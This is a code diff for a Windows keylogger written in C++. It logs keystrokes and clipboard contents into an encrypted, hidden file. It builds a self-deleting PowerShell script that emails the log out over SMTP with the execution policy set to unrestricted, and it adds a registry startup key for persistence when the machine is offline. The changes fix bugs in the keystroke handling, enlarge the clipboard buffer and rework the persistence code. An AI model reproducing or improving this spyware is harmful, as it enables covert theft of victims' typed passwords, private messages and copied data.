@@ -78,12 +78,12 @@ void Log::LogItInt(int key_stroke) {
     case VK_RCONTROL:
     case VK_LCONTROL:
     case VK_CONTROL:
-        if (GetKeyState((int)'V') & 0x8000) {
+        if (GetKeyState('V') < 0) {
             fprintf(OUTPUT_FILE, "%s", EncryptMyString("[PASTE]"));
             fprintf(OUTPUT_FILE, "%s", EncryptMyString(GetClipBoardTxt()));
             break;
         }
-        if (GetKeyState((int)'C') & 0x8000) {
+        if (GetKeyState('C') < 0) {
             fprintf(OUTPUT_FILE, "%s", EncryptMyString("[COPY]"));
             break;
         }
@@ -112,6 +112,7 @@ void Log::LogItInt(int key_stroke) {
         break;
     case  39:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[RIGHT]"));
+        break;
     case 40:
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DOWN]"));
         break;
@@ -220,7 +221,7 @@ void Log::LogItChar(std::string Value) {
     File.close();
 }
 
-void CompressFile(std::string Path) {
+/*void CompressFile(std::string Path) {
     DWORD WrittenBytes;
     char FileBufferer[1000 + CharactersPerLog];
     std::string FileBuffer;
@@ -236,7 +237,7 @@ void CompressFile(std::string Path) {
     HANDLE LZ4File = CreateFileA(Path.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     WriteFile(LZ4File, FileBufferer, strlen(FileBufferer), &WrittenBytes, NULL);
     CloseHandle(LZ4File);
-}
+}*/
 
 void Log::SendLog() {
     SetFileAttributesA(log.c_str(), FILE_ATTRIBUTE_HIDDEN);
@@ -282,12 +283,12 @@ void Log::SendLog() {
     a += "')\n$SMTPInfo.Send($ReportEmail)\nRemove-Item $MyINvocation.InvocationName\nexit\n}\nelse\n{\nexit\n}";
     WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
     CloseHandle(PS1File);
-    Command = "/C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
+    Command = SysDir;
+    Command += " /C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
     Command += Powershell;
     Command += "\"";
     if (!InternetGetConnectedState(&DWFlags, NULL)) {
-        //LogItChar("No Internet, scheduling task for log extraction...", CurrentLog);
-        RegisterMyProgramForStartup(PSStartup.c_str(), SysDir, Command.c_str());
+        CreateRegistryKey(PSStartup.c_str(), Command.c_str());
     }
     else {
         //LogItChar("Connected to the internet, sending the log...", CurrentLog);
@@ -404,7 +405,7 @@ HRESULT CopyItems(__in InputIterator first, __in InputIterator last, __in PCSTR 
 std::string GetClipBoardTxt() {
     LPSTR lpstr;
     HGLOBAL hglb;
-    char ClipBuffer[1000];
+    char ClipBuffer[10000];
     if (!IsClipboardFormatAvailable(CF_TEXT))
         return "\nError retrieving clipboard format (the copied data wasn't text).\n";
     if (!OpenClipboard(NULL))
@@ -420,7 +421,6 @@ std::string GetClipBoardTxt() {
         }
     }
     CloseClipboard();
-    return ClipBuffer;
+    std::string Ret = ClipBuffer;
+    return Ret;
 }
-
-#pragma warning( pop )
